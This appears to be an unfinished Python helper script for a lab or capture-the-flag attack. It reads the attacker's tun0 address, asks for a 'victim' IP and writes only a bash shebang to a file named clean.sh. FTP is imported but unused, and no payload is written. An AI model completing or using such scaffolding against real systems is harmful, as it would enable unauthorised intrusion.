import time
from ftplib import FTP
import os
import netifaces

class FolderProblems:
    def __init__(self):
        self.ip_victima = None

    def obtener_ip(self):
        interfaces = netifaces.interfaces()
        tun0 = netifaces.ifaddresses(interfaces[3])
        direccion_ip = tun0[2][0]['addr']
        print(f'La IP de tu interfaz tun0 es {direccion_ip}')
        return direccion_ip

    def crear_archivo(self):
        with open("clean.sh", "a") as archivo:
            archivo.write("#!/bin/bash")

    def configurar_victima(self):
        self.ip_victima = input("Introduce la IP de la máquina víctima: ")

    def ejecutar(self):
        self.configurar_victima()
        self.obtener_ip()
        time.sleep(2)
        self.crear_archivo()

if __name__ == "__main__":
    folder_problems = FolderProblems()
    folder_problems.ejecutar()
